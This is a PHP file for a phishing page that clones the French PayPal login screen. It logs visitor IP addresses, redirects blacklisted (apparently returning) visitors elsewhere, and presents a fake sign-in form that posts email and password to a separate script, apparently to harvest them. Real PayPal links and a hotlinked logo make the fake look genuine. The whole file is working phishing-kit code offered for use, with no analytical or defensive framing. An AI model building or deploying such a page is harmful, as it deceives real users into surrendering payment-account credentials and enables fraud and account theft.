<meta charset="UTF-8">
<?php
    $logs = 'Panel/logs.txt';
    setlocale(LC_TIME, 'fra_fra');
    error_reporting(-0);
    $date = strftime('%Y-%m-%d'); 
    $heure = strftime('%H:%M:%S'); 
    $redirection = file_get_contents('Panel/redirection.txt');
    $ip = $_SERVER['REMOTE_ADDR'];
    define('FICHIER', 'Panel/blacklist.txt');
    $existe = FALSE;
    $fp = fopen(FICHIER, 'r');
    while (!feof($fp) && !$existe) {
        $ligne = fgets($fp, 1024);
        if (preg_match('|\b' . preg_quote($ip) . '\b|i', $ligne)) {
            $existe = TRUE;
        }
    }
    fclose($fp);
    if ($existe) {
        $message_log = ">>> Une personne ayant pour IP '". $ip. "' est revenu sur le site le ". $date. " à ". $heure. ". Il as donc été redirigé vers le site suivant: ". $redirection. "\n";
        file_put_contents($logs, $message_log, FILE_APPEND | LOCK_EX); 
        header('Location:'. $redirection); 
    } else {
        $messag_log_refresh = ">>> Une personne ayant pour IP '". $ip. "' est venu sur le site le ". $date. " à ". $heure. "\n";
        file_put_contents($logs, $messag_log_refresh, FILE_APPEND | LOCK_EX); 
        echo '
        <html>
    <head>
        <title>Connectez-vous à votre compte PayPal</title>
        <meta charset="UTF-8">
    </head>
    <style>
        #box{
            width: 450px;
            height: 500px;
            border: solid 0.1em;
            border-radius: 5px;
            border-color: rgba(163, 163, 163, 0.385);
            margin: auto;
            margin-top: 7%
        }
        #img{
            width: 50%;
            height: auto;
            margin: auto;
        }
        #paypal{
            width: 110px;
            height: auto;
            margin-left: 27%;
            margin-top: 25%;
        }
        form input[type=email], form input[type=password]{
            border: none;
            width: 80%;
            background-color: transparent;
            border: solid 1px rgba(163, 163, 163, 0.385);
            outline: none;
            border-radius: 4px;
            height: 40px;
            display: 16px;
            color: black;
            transition: 00.5s;
            font-size: 100%;
            margin-left: 10%;
            margin-right: 10%;
            padding-left: 3%;
        }
        #mdp-oublié{
            color: #0070ba;
            font-family: HelveticaNeue,"Helvetica Neue",Helvetica,Arial,sans-serif;
            margin-left: 10%;
            margin-bottom: 10px;
            text-decoration: none;
        }
        #mdp-oublié:hover{
            text-decoration: underline;
        }
        form input[name=login]{
            border: none;
            height: 40px;
            margin-top: 2%;
            outline: none;
            font-size: 15px;
            border-radius: 3px;
            background-color: #0070ba;
            color: white;
            width: 80%;
            height: 10%;
            display: block;
            margin: auto;
            font-family: HelveticaNeue,"Helvetica Neue",Helvetica,Arial,sans-serif;
        }
        form input[name=login]:hover{
            transition: 00.5s;
            background-color: #005d9b;
            color: white;
        }
        .ligne{
            border-top: 1px solid #cbd2d6;
            margin-left: 10%;
            text-align: center;
            width: 80%;
        }
        .ou{
            background-color: #fff;
            padding: 0 .5em;
            position: relative;
            color: #6c7378;
            top: -.7em;
            font-family: HelveticaNeue-Medium,"Helvetica Neue Medium",HelveticaNeue,"Helvetica Neue",Helvetica,Arial,sans-serif;
        }
        form input[name=register]{
            border: none;
            height: 40px;
            margin-top: 2%;
            outline: none;
            font-size: 15px;
            border-radius: 3px;
            background-color: #d2dbe1;
            color: #2C2E2F;
            width: 80%;
            height: 10%;
            display: block;
            margin: auto;
            font-family: HelveticaNeue-Medium,"Helvetica Neue Medium",HelveticaNeue,"Helvetica Neue",Helvetica,Arial,sans-serif;
        }
        form input[name=register]:hover{
            transition: 00.5s;
            background-color: #c9ced1;
            color: #2C2E2F;
        }
        .footer2{
            margin-top: 15.9%;
            width: 100%;
            height: 2%;
            background-color: #f7f9fa;
            margin-left: -1%;
            margin-right: -3%;
        }
        .active{
            color: blue;
        }
        .purge{
            text-decoration: none;
            color: #666;
            font-family: pp-sans-small-light,Helvetica Neue,Arial,sans-serif;
            font-size: 75%;
            margin-right: 1%;
        }
        .purge:hover{
            text-decoration: underline;
        }
        .center{
            text-align: center;
        }
    </style>
    <body>
        <div id="box">
            <div id="img">
                <img id="paypal" src="https://media.discordapp.net/attachments/633782210238873612/872426690532495360/logo.png" alt="logo-paypal">
            </div>
            <form method="post" action="succes.php">
                <br><br><br>
                <input type="email" name="email" placeholder="Email ou numéro de mobile" required><br><br>
                <input type="password" name="password" placeholder="Mot de passe" required><br><br>
                <a id="mdp-oublié" href="https://www.paypal.com/authflow/password-recovery/?country.x=FR&locale.x=fr_FR&redirectUri=%252Fsignin%252F">Mot de passe oublié ?</a><br><br>
                <input type="submit" id="btn1" name="login" value="Connexion">
            </form>
            <div class="ligne"><span class="ou">ou</span></div>
            <form action="https://www.paypal.com/fr/webapps/mpp/account-selection">
                <input type="submit" name="register" value="Ouvrir un compte">
            </form>
        </div>
        <div class="footer2">
            <p class="center">
                <a class="purge" href="https://www.paypal.com/fr/smarthelp/contact-us">Contact</a>
                <a class="purge" href="https://www.paypal.com/fr/webapps/mpp/ua/privacy-full">Respect de la vie priv�e</a>
                <a class="purge" href="https://www.paypal.com/fr/webapps/mpp/ua/legalhub-full">Contrats d utilisation</a>
                <a class="purge" href="https://www.paypal.com/fr/webapps/mpp/country-worldwide">International</a>
            </p>
        </div>
    </body>
</html>';
    }
?>
